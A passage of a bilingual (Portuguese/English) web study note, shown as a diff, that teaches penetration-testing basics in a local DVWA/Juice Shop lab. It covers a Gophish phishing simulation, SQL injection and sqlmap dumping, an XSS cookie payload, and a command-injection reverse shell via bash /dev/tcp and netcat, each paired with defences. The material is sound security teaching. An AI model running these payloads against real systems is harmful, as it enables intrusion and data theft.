an access-controlled door with no badge of their own, relying on politeness</span></td></tr></tbody></table></div>
+<h3><span class="pt">Laboratório: uma campanha de phishing simulada</span><span class="en">Lab: a simulated phishing campaign</span></h3>
+<p><span class="pt"><code>Gophish</code> é um framework de código aberto feito exatamente para isso: equipes de segurança o usam para treinar a própria organização, enviando phishing simulado e medindo quem clicou — sem nenhum dado real sendo roubado.</span><span class="en"><code>Gophish</code> is an open-source framework built exactly for this: security teams use it to train their own organisation, sending simulated phishing and measuring who clicked — with no real data ever stolen.</span></p>
+<pre><code>docker run -d --name gophish -p 127.0.0.1:3333:3333 -p 127.0.0.1:8080:80 gophish/gophish
+docker logs gophish 2&gt;&amp;1 | grep -i <span class="tok-s">"password"</span>   <span class="tok-c"># a senha inicial do admin fica nos logs do container</span>
+<span class="tok-c"># abra https://localhost:3333 (aceite o certificado autoassinado) e entre com admin / a senha acima</span></code></pre>
+<p><span class="pt">No painel, crie: um "Sending Profile" (um servidor SMTP de teste, como o <a href="https://mailtrap.io" rel="noopener">Mailtrap</a>, que captura e-mails sem enviá-los de verdade), um "Landing Page" (uma cópia visual de uma tela de login, só para medir cliques) e um grupo de "alvos" com e-mails fictícios seus. Dispare a campanha e veja o painel mostrar, em tempo real, quem abriu o e-mail e quem clicou — é exatamente essa métrica que times de segurança usam para medir o risco humano da própria empresa.</span><span class="en">In the panel, create: a "Sending Profile" (a test SMTP server, like <a href="https://mailtrap.io" rel="noopener">Mailtrap</a>, which captures emails without really sending them), a "Landing Page" (a visual copy of a login screen, just to measure clicks) and a "targets" group with fictional emails of your own. Launch the campaign and watch the panel show, in real time, who opened the email and who clicked — this is exactly the metric security teams use to measure their own company's human risk.</span></p>
+<p><span class="pt"><strong>Resultado esperado:</strong> o painel do Gophish mostra uma linha do tempo com "Email Sent" → "Email Opened" → "Clicked Link" para cada alvo de teste, sem que nenhum e-mail real tenha saído (o Mailtrap intercepta tudo). É assim que uma empresa mede sua taxa de cliques antes e depois de um treinamento de conscientização.</span><span class="en"><strong>Expected result:</strong> the Gophish dashboard shows a timeline with "Email Sent" → "Email Opened" → "Clicked Link" for each test target, with no real email ever leaving (Mailtrap intercepts everything). This is how a company measures its click rate before and after an awareness training.</span></p>
+<h3><span class="pt">Defesa: processo e cultura, não só filtro de spam</span><span class="en">Defence: process and culture, not just a spam filter</span></h3>
+<div class="scroll-x"><table class="ds-table"><thead><tr><th><span class="pt">Controle</span><span class="en">Control</span></th><th><span class="pt">Reduz</span><span class="en">Reduces</span></th></tr></thead><tbody><tr><td><span class="pt">SPF, DKIM e DMARC no domínio</span><span class="en">SPF, DKIM and DMARC on the domain</span></td><td><span class="pt">e-mails forjados "de" o seu próprio domínio chegando a outras empresas, e vice-versa</span><span class="en">emails forged "from" your own domain reaching other companies, and vice versa</span></td></tr><tr><td><span class="pt">MFA resistente a phishing (chaves FIDO2/passkeys)</span><span class="en">Phishing-resistant MFA (FIDO2 keys/passkeys)</span></td><td><span class="pt">uma senha roubada sozinha não é mais suficiente para entrar</span><span class="en">a stolen password alone is no longer enough to log in</span></td></tr><tr><td><span class="pt">Cultura de verificação ("ligue de volta pelo número oficial")</span><span class="en">A verification culture ("call back on the official number")</span></td><td><span class="pt">pedidos urgentes e fora do padrão por e-mail/telefone sozinho</span><span class="en">urgent, out-of-the-ordinary requests by email/phone alone</span></td></tr><tr><td><span class="pt">Treinamento recorrente + campanhas simuladas (como a do Gophish acima)</span><span class="en">Recurring training + simulated campaigns (like the Gophish one above)</span></td><td><span class="pt">a taxa de cliques cai de forma mensurável com prática</span><span class="en">the click rate measurably drops with practice</span></td></tr><tr><td><span class="pt">Crachá visível + política de "sem exceção" para tailgating</span><span class="en">Visible badge + a "no exceptions" tailgating policy</span></td><td><span class="pt">acesso físico não autorizado</span><span class="en">unauthorised physical access</span></td></tr><tr><td><span class="pt">Desabilitar USB autorun; política de "achou, entregue, não conecte"</span><span class="en">Disable USB autorun; a "found it, hand it in, don't plug it in" policy</span></td><td><span class="pt">ataques de baiting com pendrive</span><span class="en">USB baiting attacks</span></td></tr></tbody></table></div>
+</section>
+<section class="content-section" aria-labelledby="exploitation">
+<h2 id="exploitation"><span class="pt">Exploração: SQL injection e XSS</span><span class="en">Exploitation: SQL injection and XSS</span></h2>
+
+<p><span class="pt">"Exploração" é usar uma falha específica para fazer um sistema fazer algo que não deveria. A grande maioria das falhas exploradas em aplicações web cabe nas categorias do <a href="https://owasp.org/www-project-top-ten/" rel="noopener">OWASP Top 10</a>, a lista mais citada do setor. Os dois exemplos abaixo rodam contra o DVWA do laboratório desta nota (nível de segurança "low", de propósito).</span><span class="en">"Exploitation" is using a specific flaw to make a system do something it should not. The vast majority of flaws exploited in web applications fall into the categories of the <a href="https://owasp.org/www-project-top-ten/" rel="noopener">OWASP Top 10</a>, the industry's most-cited list. The two examples below run against this note's lab DVWA (security level "low", on purpose).</span></p>
+<h3><span class="pt">SQL injection: a consulta que você não escreveu</span><span class="en">SQL injection: the query you did not write</span></h3>
+<p><span class="pt">Quando uma aplicação cola a entrada do usuário direto dentro de uma consulta SQL, em vez de tratá-la como um VALOR, o usuário pode mudar a estrutura da consulta. É a falha mais didática que existe, e ainda uma das mais comuns em código legado.</span><span class="en">When an application pastes user input straight into a SQL query, instead of treating it as a VALUE, the user can change the query's structure. It is the most teachable flaw there is, and still one of the most common in legacy code.</span></p>
+<pre><code><span class="tok-c">-- o que o formulário de login do DVWA MONTA por baixo (vulnerável)</span>
+<span class="tok-k">SELECT</span> * <span class="tok-k">FROM</span> users <span class="tok-k">WHERE</span> username = <span class="tok-s">'$usuario'</span> <span class="tok-k">AND</span> <span class="tok-k">password</span> = <span class="tok-s">'$senha'</span>;
+
+<span class="tok-c">-- se você digitar isto no campo "usuario":</span>
+<span class="tok-s">' OR '</span><span class="tok-n">1</span><span class="tok-s">'='</span><span class="tok-n">1</span>
+
+<span class="tok-c">-- a consulta vira:</span>
+<span class="tok-k">SELECT</span> * <span class="tok-k">FROM</span> users <span class="tok-k">WHERE</span> username = <span class="tok-s">''</span> <span class="tok-k">OR</span> <span class="tok-s">'1'</span>=<span class="tok-s">'1'</span> <span class="tok-k">AND</span> <span class="tok-k">password</span> = <span class="tok-s">'...'</span>;
+<span class="tok-c">-- '1'='1' é sempre verdadeiro: a condição inteira vira verdadeira, login sem senha certa</span></code></pre>
+<p><span class="pt">No DVWA (módulo "SQL Injection", nível low), digite <code>1 OR 1=1</code> no campo de busca por ID de usuário. <strong>Resultado esperado:</strong> em vez de um usuário, a consulta retorna TODOS — a mesma lógica do exemplo acima, mas lendo dados em vez de pular uma senha.</span><span class="en">In DVWA ("SQL Injection" module, low level), type <code>1 OR 1=1</code> in the user-ID search field. <strong>Expected result:</strong> instead of one user, the query returns ALL of them — the same logic as the example above, but reading data instead of skipping a password.</span></p>
+<pre><code><span class="tok-c"># a mesma falha, encontrada automaticamente (ferramenta padrão do setor)</span>
+docker compose exec kali sqlmap -u <span class="tok-s">"http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> \
+  --cookie=<span class="tok-s">"PHPSESSID=&lt;copie do navegador&gt;; security=low"</span> --batch --dump</code></pre>
+<div class="callout"><svg class="icon" aria-hidden="true"><use href="#i-check"/></svg> <span class="pt"><code>sqlmap</code> automatiza exatamente esse raciocínio: testa dezenas de variações da injeção até achar uma que funcione. É a ferramenta padrão de pentest para esse tipo de falha — e também o que um time de defesa roda contra a própria aplicação antes de ela ir para produção.</span><span class="en"><code>sqlmap</code> automates exactly this reasoning: it tries dozens of injection variants until one works. It is the standard pentest tool for this kind of flaw — and also what a defence team runs against its own application before it goes to production.</span></div>
+<h3><span class="pt">Cross-site scripting (XSS): a entrada que vira código</span><span class="en">Cross-site scripting (XSS): input that becomes code</span></h3>
+<p><span class="pt">Se a aplicação devolve a entrada do usuário para a página HTML sem tratar, o navegador de QUEM VISUALIZAR executa o que foi digitado. No Juice Shop, procure um campo de busca ou comentário e tente:</span><span class="en">If the application echoes user input back into the HTML page without treating it, the browser of WHOEVER VIEWS IT executes what was typed. In Juice Shop, find a search or comment field and try:</span></p>
+<pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
+<p><span class="pt"><strong>Resultado esperado:</strong> uma caixa de alerta aparece mostrando o cookie da sessão — prova de que o navegador executou código que veio de um campo de texto. Num ataque real, em vez de <code>alert()</code>, esse script manda o cookie para um servidor do atacante, que o usa para assumir a sessão da vítima sem saber a senha dela.</span><span class="en"><strong>Expected result:</strong> an alert box appears showing the session cookie — proof the browser executed code that came from a text field. In a real attack, instead of <code>alert()</code>, that script sends the cookie to an attacker's server, who uses it to take over the victim's session without knowing their password.</span></p>
+<h3><span class="pt">Defesa: tratar toda entrada como hostil</span><span class="en">Defence: treat all input as hostile</span></h3>
+<div class="scroll-x"><table class="ds-table"><thead><tr><th><span class="pt">Falha</span><span class="en">Flaw</span></th><th><span class="pt">Defesa principal</span><span class="en">Main defence</span></th></tr></thead><tbody><tr><td><span class="pt">SQL injection</span><span class="en">SQL injection</span></td><td><span class="pt">consultas parametrizadas / prepared statements (NUNCA concatenar texto do usuário no SQL) — veja a nota de Postgres</span><span class="en">parameterised queries / prepared statements (NEVER concatenate user text into SQL) — see the Postgres note</span></td></tr><tr><td><span class="pt">XSS</span><span class="en">XSS</span></td><td><span class="pt">escapar toda saída por padrão (a maioria dos frameworks modernos já faz isso) + um Content-Security-Policy restritivo</span><span class="en">escape all output by default (most modern frameworks already do this) + a strict Content-Security-Policy</span></td></tr><tr><td><span class="pt">Ambas</span><span class="en">Both</span></td><td><span class="pt">validação de entrada no servidor (nunca só no navegador), princípio do menor privilégio no usuário do banco, scanner de dependências/SAST no CI</span><span class="en">server-side input validation (never only in the browser), least privilege on the database user, a dependency/SAST scanner in CI</span></td></tr><tr><td><span class="pt">Geral</span><span class="en">General</span></td><td><span class="pt">um WAF (Web Application Firewall) como camada extra — nunca a única</span><span class="en">a WAF (Web Application Firewall) as an extra layer — never the only one</span></td></tr></tbody></table></div>
+</section>
+<section class="content-section" aria-labelledby="shell">
+<h2 id="shell"><span class="pt">Do comando ao shell: o que vem depois</span><span class="en">From command to shell: what comes next</span></h2>
+
+<p><span class="pt">Quando uma falha permite executar comandos no servidor (não só ler dados), o próximo passo típico é abrir um <em>shell reverso</em>: o servidor vulnerável se conecta DE VOLTA para uma máquina do atacante, que fica ouvindo numa porta. "Reverso" porque é o alvo que inicia a conexão — o que costuma atravessar firewalls configurados só para bloquear conexões de ENTRADA.</span><span class="en">When a flaw allows running commands on the server (not just reading data), the typical next step is opening a <em>reverse shell</em>: the vulnerable server connects BACK to an attacker machine, which is listening on a port. "Reverse" because the target initiates the connection — which tends to sail through firewalls configured only to block INBOUND connections.</span></p>
+<figure class="fig"><div class="fig-scroll"><svg viewBox="0 0 600 170" role="img" aria-label="Shell reverso / Reverse shell" style="min-width:560px">
+<rect x="10" y="60" width="180" height="60" rx="4" class="ln fillsoft"/>
+<text x="100.0" y="87.0" class="pt " text-anchor="middle">seu "kali" (ouvindo)</text><text x="100.0" y="87.0" class="en " text-anchor="middle">your "kali" (listening)</text>
+<text x="100.0" y="103.0" class="mut mono" text-anchor="middle">nc -lvnp 4444</text>
+<rect x="400" y="60" width="180" height="60" rx="4" class="ln"/>
+<text x="490.0" y="87.0" class="pt " text-anchor="middle">DVWA (vulnerável)</text><text x="490.0" y="87.0" class="en " text-anchor="middle">DVWA (vulnerable)</text>
+<text x="490.0" y="103.0" class="pt mut mono" text-anchor="middle">campo de comando</text><text x="490.0" y="103.0" class="en mut mono" text-anchor="middle">command field</text>
+<path d="M400 90L190 90" class="ln"/><path d="M197.2 86.5L190 90L197.2 93.5" class="ln"/>
+<text x="295" y="80" class="pt mut" text-anchor="middle">← conecta de volta</text><text x="295" y="80" class="en mut" text-anchor="middle">← connects back</text>
+<text x="10" y="150" class="pt mut">O alvo INICIA a conexão para você; muitos firewalls só filtram quem tenta entrar, não quem tenta sair.</text><text x="10" y="150" class="en mut">The target INITIATES the connection to you; many firewalls only filter inbound attempts, not outbound ones.</text>
+</svg></div><figcaption><span class="pt">A lógica de um shell reverso: o "ataque" é convencer o alvo a rodar o comando de conexão.</span><span class="en">The logic of a reverse shell: the "attack" is convincing the target to run the connect-back command.</span></figcaption></figure>
+<h3><span class="pt">Exercício: do campo de comando ao shell</span><span class="en">Exercise: from the command field to a shell</span></h3>
+<pre><code><span class="tok-c"># 1. no seu "kali" (laboratório): abra um ouvinte</span>
+docker compose exec kali nc -lvnp 4444
+
+<span class="tok-c"># 2. no DVWA (módulo "Command Injection", nível low), no campo que pede um IP para "ping",</span>
+<span class="tok-c">#    digite (troque pelo IP do container kali: docker inspect lab-redteam-kali-1):</span>
+127.0.0.1; bash -c <span class="tok-s">'bash -i &gt;&amp; /dev/tcp/IP_DO_KALI/4444 0&gt;&amp;1'</span></code></pre>
+<p><span class="pt"><strong>Resultado esperado:</strong> o terminal do <code>nc</code> no kali ganha um prompt interativo DENTRO do contêiner do DVWA — digite <code>whoami</code> ou <code>id</code> e veja o usuário do servidor web respondendo, como se você tivesse um terminal lá. É exatamente assim que um "ponto de apoio" inicial vira controle de um sistema.</span><span class="en"><strong>Expected result:</strong> the <code>nc</code> terminal on kali gets an interactive prompt INSIDE the DVWA container — type <code>whoami</code> or <code>id</code> and see the web server's user answer, as if you had a terminal there. This is exactly how an initial "foothold" becomes control of a system.</span></p>
+<h3><span class="pt">Depois do shell: o que um atacante faria</span><span class="en">After the shell: what an attacker would do</span></h3>
+<div class="scroll-x"><table class="ds-table"><thead><tr><th><span class="pt">Fase</span><span class="en">Phase</span></th><th><span class="pt">Ideia</span><span class="en">Idea</span></th><th><span class="pt">Ferramenta citada (sem instruções)</span><span class="en">Tool named (no instructions)</span></th></tr></thead><tbody><tr><td><span class="pt">Escalada de privilégio</span><span class="en">Privilege escalation</span></td><td><span class="pt">procurar binários SUID, cron jobs mal configurados, senhas em arquivos — veja a nota de Linux, seção de permissões</span><span class="en">looking for SUID binaries, misconfigured cron jobs, passwords in files — see the Linux note, permissions section</span></td><td>linPEAS</td></tr><tr><td><span class="pt">Persistência</span><span class="en">Persistence</span></td><td><span class="pt">deixar uma forma de voltar depois (uma chave SSH extra, um serviço, uma tarefa agendada)</span><span class="en">leaving a way back later (an extra SSH key, a service, a scheduled task)</span></td><td>—</td></tr><tr><td><span class="pt">Movimento lateral</span><span class="en">Lateral movement</span></td><td><span class="pt">usar o host comprometido como ponte para alcançar outras máquinas da mesma rede interna (o mesmo princípio do <code>ssh -D</code> da nota de segurança e redes)</span><span class="en">using the compromised host as a bridge to reach other machines on the same internal network (the same idea as <code>ssh -D</code> in the security and networking note)</span></td><td>proxychains</td></tr><tr><td><span class="pt">Comando e controle (C2)</span><span class="en">Command and control (C2)</span></td><td><span class="pt">em vez de um <code>nc</code> simples, um framework cifrado, resiliente a quedas, para controlar vários hosts de uma vez</span><span class="en">instead of plain <code>nc</code>, an encrypted, drop-resilient framework to control several hosts at once</span></td><td>Metasploit, Sliver, Cobalt Strike</td></tr><tr><td><span class="pt">Exfiltração</span><span class="en">Exfiltration</span></td><td><span class="pt">copiar dados para fora, muitas vezes disfarçados de tráfego comum (DNS, HTTPS)</span><span class="en">copying data out, often disguised as ordinary traffic (DNS, HTTPS)</span></td><td>—</td></tr></tbody></table></div>
+<div class="callout warn"><svg class="icon" aria-hidden="true"><use href="#i-alert"/></svg> <span class="pt">Esta tabela é um mapa de conceitos, de propósito sem comandos prontos para as fases depois do shell — são exatamente as etapas que mais dependem do alvo específico, e as mais fáceis de usar mal fora de um contrato de pentest. Para praticar de verdade e com segurança, plataformas como TryHackMe e Hack The Box (já citadas na nota de segurança e redes) têm máquinas inteiras desenhadas para isso.</span><span class="en">This table is a map of concepts, deliberately without ready-made commands for the phases after the shell — these are exactly the steps that depend most on the specific target, and the easiest to misuse outside a pentest contract. To practise for real and safely, platforms like TryHackMe and Hack The Box (already named in the security and networking note) have whole machines designed for this.</span></div>
+<h3><span class="pt">Defesa: supor que alguém vai conseguir um shell</span><span class="en">Defence: assume someone will get a shell</span></h3>
+<div class="scroll-x"><table class="ds-table"><thead><tr><th><span class="pt">Controle</span><span class="en">Control</span></th><th><span class="pt">Reduz</span><span class="en">Reduces</span></th></tr></thead><tbody><tr><td><span class="pt">Filtragem de saída (egress filtering)</span><span class="en">Egress filtering</span></td><td><span class="pt">um shell reverso precisa que o SERVIDOR consiga abrir uma conexão de saída não usual — bloqueie isso por padrão</span><span class="en">a reverse shell needs the SERVER to open an unusual outbound connection — block that by default</span></td></tr><tr><td><span class="pt">Princípio do menor privilégio</span><span class="en">Least privilege</span></td><td><span class="pt">o usuário que roda a aplicação web não deveria ter permissão de executar comandos do sistema</span><span class="en">the user running the web application should not have permission to run system commands</span></td></tr><tr><td><span class="pt">EDR / monitoramento de processos</span><span class="en">EDR / process monitoring</span></td><td><span class="pt">alerta quando um processo de servidor web gera um shell filho (<code>bash</code>, <code>sh</code>, <code>powershell</code>) — um padrão muito incomum e muito usado para detecção</span><span class="en">alerts when a web server process spawns a child shell (<code>bash</code>, <code>sh</code>, <code>powershell</code>) — a very unusual pattern and a common detection signature</span></td></tr><tr><td><span class="pt">Segmentação de rede</span><span class="en">Network segmentation</span></td><td><span class="pt">limita até onde um host comprometido consegue "andar" (movimento lateral)</span><span class="en">limits how far a compromised host can "walk" (lateral movement)</span></td></tr><tr><td><span class="pt">Backups testados e offline</span><span class="en">Tested, offline backups</span></td><td><span class="pt">reduz o impacto se tudo mais falhar — veja a regra 3-2-1 na nota de Postgres</span><span class="en">reduces the impact if everything else fails — see the 3-2-1 rule in the Postgres note</span></td></tr></tbody></table></div>
+</section>
+<section class="content-section" aria-labelledby="cheat-rt">
+<h2 id="cheat-rt"><span class="pt">Cola e revisão</span><span class="en">Cheat sheet and review</span></h2>
+
+<h3><span class="pt">Cola: o ciclo e a defesa de cada fase</span><span class="en">Cheat sheet: the lifecycle and each phase's defence</span></h3>
+<div class="scroll-x"><table class="ds-table"><thead><tr><th><span class="pt">Fase</span><span class="en">Phase</span></th><th><span class="pt">Pergunta que o atacante faz</span><span class="en">Question the attacker asks</span></th><th><span class="pt">Defesa principal</span><span class="en">Main defence</span></th></tr></thead><tbody><tr><td><span class="pt">Recon</span><span class="en">Recon</span></td><td><span class="pt">o que existe, publicamente?</span><span class="en">what exists, publicly?</span></td><td>inventário de ativos, remover metadados, monitorar vazamentos</td></tr><tr><td><span class="pt">Engenharia social</span><span class="en">Social engineering</span></td><td><span class="pt">quem confia em quem, e por quê?</span><span class="en">who trusts whom, and why?</span></td><td>MFA resistente a phishing, cultura de verificação, treinamento</td></tr><tr><td><span class="pt">Exploração</span><span class="en">Exploitation</span></td><td><span class="pt">o que essa entrada faz se eu mudar o formato dela?</span><span class="en">what does this input do if I change its shape?</span></td><td>consultas parametrizadas, escapar saída, validar no servidor</td></tr><tr><td><span class="pt">Shell / execução</span><span class="en">Shell / execution</span></td><td><span class="pt">consigo rodar um comando meu aqui?</span><span class="en">can I run a command of mine here?</span></td><td>menor privilégio, filtragem de saída, EDR</td></tr><tr><td><span class="pt">Escalada e persistência</span><span class="en">Escalation and persistence</span></td><td><span class="pt">como viro alguém com mais poder, e fico?</span><span class="en">how do I become someone with more power, and stay?</span></td><td>patches, auditoria de SUID/cron, menor privilégio</td></tr><tr><td><span class="pt">Movimento lateral</span><span class="en">Lateral movement</span></td><td><span class="pt">que outras máquinas esse host alcança?</span><span class="en">what other machines can this host reach?</span></td><td>segmentação de rede, firewall interno</td></tr><tr><td><span class="pt">Exfiltração</span><span class="en">Exfiltration</span></td><td><span class="pt">como tiro dados sem ser notado?</span><span class="en">how do I get data out unnoticed?</span></td><td>filtragem de saída, DLP, alertas de anomalia</td></tr></tbody></table></div>
+<h3><span class="pt">Perguntas de revisão</span><span class="en">Review questions</span></h3>
+<div class="scroll-x"><table class="ds-table"><thead><tr><th><span class="pt">Pergunta</span><span class="en">Question</span></th><th><span class="pt">Resposta</span><span class="en">Answer</span></th></tr></thead><tbody><tr><td><span class="pt">Por que um pentest precisa de um contrato antes de começar?</span><span class="en">Why does a pentest need a contract before it starts?</span></td><td><span class="pt">Porque as mesmas técnicas, sem autorização por escrito e escopo definido, são crime em praticamente todo lugar.</span><span class="en">Because the same techniques, without written authorization and a defined scope, are a crime almost everywhere.</span></td></tr><tr><td><span class="pt">Qual a diferença entre recon passivo e ativo?</span><span class="en">What is the difference between passive and active recon?</span></td><td><span class="pt">Passivo não toca o alvo (WHOIS, Shodan); ativo manda pacotes para ele (nmap).</span><span class="en">Passive never touches the target (WHOIS, Shodan); active sends packets to it (nmap).</span></td></tr><tr><td><span class="pt">Por que o phishing é o vetor inicial mais comum, segundo os relatórios do setor?</span><span class="en">Why is phishing the most common initial vector, per industry reports?</span></td><td><span class="pt">Explora confiança humana, que é mais difícil de corrigir com uma atualização do que uma falha de software.</span><span class="en">It exploits human trust, which is harder to patch than a software flaw.</span></td></tr><tr><td><span class="pt">O que uma consulta parametrizada evita, que concatenar texto não evita?</span><span class="en">What does a parameterised query prevent that concatenating text does not?</span></td><td><span class="pt">Trata a entrada do usuário sempre como um VALOR, nunca como parte da estrutura do comando SQL.</span><span class="en">It always treats user input as a VALUE, never as part of the SQL command's structure.</span></td></tr><tr><td><span class="pt">Por que um shell reverso costuma passar por firewalls que bloqueiam entrada?</span><span class="en">Why does a reverse shell usually get past firewalls that block inbound traffic?</span></td><td><span class="pt">Porque é o ALVO que inicia a conexão de saída, não o atacante que tenta entrar.</span><span class="en">Because the TARGET initiates the outbound connection, not the attacker trying to get in.</span></td></tr><tr><td><span class="pt">O que é movimento lateral?</span><span class="en">What is lateral movement?</span></td><td><span class="pt">Usar um host já comprometido como ponte para alcançar outras máquinas da mesma rede.</span><span class="en">Using an already-compromised host as a bridge to reach other machines on the same network.</span></td></tr><tr><td><span class="pt">Cite dois controles que reduzem o risco de engenharia social sem depender só do usuário perceber.</span><span class="en">Name two controls that reduce social-engineering risk without relying solely on the user noticing.</span></td><td><span class="pt">MFA resistente a phishing e SPF/DKIM/DMARC no domínio (entre outros: segmentação, menor privilégio).</span><span class="en">Phishing-resistant MFA and SPF/DKIM/DMARC on the domain (among others: segmentation, least privilege).</span></td></tr></tbody></table></div>
+</section>
+<div class="sources"><b><span class="pt">Fontes</span><span class="en">Sources</span></b><ul><li><a href="https://attack.mitre.org/" rel="noopener">MITRE ATT&CK. The public, industry-standard catalogue of adversary tactics and techniques.</a></li><li><a href="https://owasp.org/www-project-top-ten/" rel="noopener">OWASP Top 10. The most-cited list of web application security risks.</a></li><li><a href="https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470" rel="noopener">Dafydd Stuttard and Marcus Pinto. The Web Application Hacker's Handbook, 2nd edition. Wiley, 2011.</a></li><li><a href="https://www.social-engineer.org/" rel="noopener">Christopher Hadnagy. Social Engineering: The Science of Human Hacking, 2nd edition. Wiley, 2018 (and the Social-Engineer.org framework).</a></li><li><a href="https://www.getgophish.com/" rel="noopener">Gophish documentation. Open-source phishing simulation framework.</a></li><li><a href="http://www.pentest-standard.org/" rel="noopener">Penetration Testing Execution Standard (PTES).</a></li><li><a href="https://csrc.nist.gov/pubs/sp/800/115/final" rel="noopener">NIST Special Publication 800-115. Technical Guide to Information Security Testing and Assessment.</a></li><li><a href="https://dvwa.co.uk/" rel="noopener">Damn Vulnerable Web Application (DVWA) project.</a></li><li><a href="https://owasp.org/www-project-juice-shop/" rel="noopener">OWASP Juice Shop project.</a></li><li><a href="https://www.comptia.org/certifications/pentest" rel="noopener">CompTIA PenTest+ exam objectives.</a></li></ul></div>
+
+      </article>
+    </div>
+  </main>
+
+  <footer class="site-footer">
+    <div class="site-footer-grid">
+      <div class="footer-brand">
+        <svg class="logo-mark" viewBox="0 0 32 32" aria-hidden="true"><path d="M -4.75,-2.5 C -9.025,-6.5 -5.35,-11.5 0,-15.0 C 5.35,-11.5 9.025,-6.5 4.75,-2.5 C 2.09,0.5 -2.09,0.5 -4.75,-2.5 Z" fill="currentColor" stroke="#8a5cf0" stroke-width="0.8" stroke-linejoin="round" transform="rotate(-90.0 16 16) translate(16 16)"/><path d="M -4.75,-2.5 C -9.025,-6.5 -5.35,-11.5 0,-15.0 C 5.35,-11.5 9.025,-6.5 4.75,-2.5 C 2.09,0.5 -2.09,0.5 -4.75,-2.5 Z" fill="currentColor" stroke="#8a5cf0" stroke-width="0.8" stroke-linejoin="round" transform="rotate(-18.0 16 16) translate(16 16)"/><path d="M -4.75,-2.5 C -9.025,-6.5 -5.35,-11.5 0,-15.0 C 5.35,-11.5 9.025,-6.5 4.75,-2.5 C 2.09,0.5 -2.09,0.5 -4.75,-2.5 Z" fill="currentColor" stroke="#8a5cf0" stroke-width="0.8" stroke-linejoin="round" transform="rotate(54.0 16 16) translate(16 16)"/><path d="M -4.75,-2.5 C -9.025,-6.5 -5.35,-11.5 0,-15.0 C 5.35,-11.5 9.025,-6.5 4.75,-2.5 C 2.09,0.5 -2.09,0.5 -4.75,-2.5 Z" fill="currentColor" stroke="#8a5cf0" stroke-width="0.8" stroke-linejoin="round" transform="rotate(126.0 16 16) translate(16 16)"/><path d="M -4.75,-2.5 C -9.025,-6.5 -5.35,-11.5 0,-15.0 C 5.35,-11.5 9.025,-6.5 4.75,-2.5 C 2.09,0.5 -2.09,0.5 -4.75,-2.5 Z" fill="currentColor" stroke="#8a5cf0" stroke-width="0.8" stroke-linejoin="round" transform="rotate(198.0 16 16) translate(16 16)"/><path d="M 0,-3.5 C 1.1,-7.5 0.6,-11.875 0,-13.7" fill="none" stroke="#8a5cf0" stroke-width="0.65" stroke-linecap="round" transform="rotate(-90.0 16 16) translate(16 16)"/><path d="M 0,-3.5 C 1.1,-7.5 0.6,-11.875 0,-13.7" fill="none" stroke="#8a5cf0" stroke-width="0.65" stroke-linecap="round" transform="rotate(-18.0 16 16) translate(16 16)"/><path d="M 0,-3.5 C 1.1,-7.5 0.6,-11.875 0,-13.7" fill="none" stroke="#8a5cf0" stroke-width="0.65" stroke-linecap="round" transform="rotate(54.0 16 16) translate(16 16)"/><path d="M 0,-3.5 C 1.1,-7.5 0.6,-11.875 0,-13.7" fill="none" stroke="#8a5cf0" stroke-width="0.65" stroke-linecap="round" transform="rotate(126.0 16 16) translate(16 16)"/><path d="M 0,-3.5 C 1.1,-7.5 0.6,-11.875 0,-13.7" fill="none" stroke="#8a5cf0" stroke-width="0.65" stroke-linecap="round" transform="rotate(198.0 16 16) translate(16 16)"/><circle cx="16" cy="16" r="1.9" fill="#8a5cf0"/></svg>
+        <p class="motto"><em>Non desistas. Non exieris.</em></p>
+      </div>
+
+      <nav class="footer-column" aria-labelledby="footer-company-heading">
+        <h2 id="footer-company-heading" class="monospace-label" data-i18n="footer.company">Company</h2>
+        <a href="../../index.html#about" data-i18n="nav.about">About</a>
+        <a href="../../index.html#principles" data-i18n="nav.principles">Principles</a>
+        <a href="../index.html" data-i18n="nav.notes">Notes</a>
+      </nav>
+
+      <div class="footer-column requires-js" role="group" aria-labelledby="footer-language-heading">
+        <h2 id="footer-language-heading" class="monospace-label" data-i18n="footer.language">Language</h2>
+        <button type="button" data-language-option="en" lang="en">English</button>
+        <button type="button" data-language-option="pt-BR" lang="pt-BR">Português (Brasil)</button>
+      </div>
+
+      <nav class="footer-column" aria-labelledby="footer-index-heading">
+        <h2 id="footer-index-heading" class="monospace-label" data-i18n="footer.index">Index</h2>
+        <a href="../../sitemap.xml">Sitemap</a>
+        <a href="../../llms.txt">llms.txt</a>
+      </nav>
+
+      <div class="footer-column requires-js">
+        <h2 class="monospace-label" data-i18n="footer.localTime">Local time</h2>
+        <p><time data-local-time></time> · <span data-day-period></span></p>
+      </div>
+    </div>
+
+    <p class="footer-legal monospace-label">Baselarte Ltda. © <span data-current-year></span></p>
+  </footer>
+
+  <script src="../../i18n.js"></script>
+  <script src="../../main.js"></script>
+</body>
+</html>
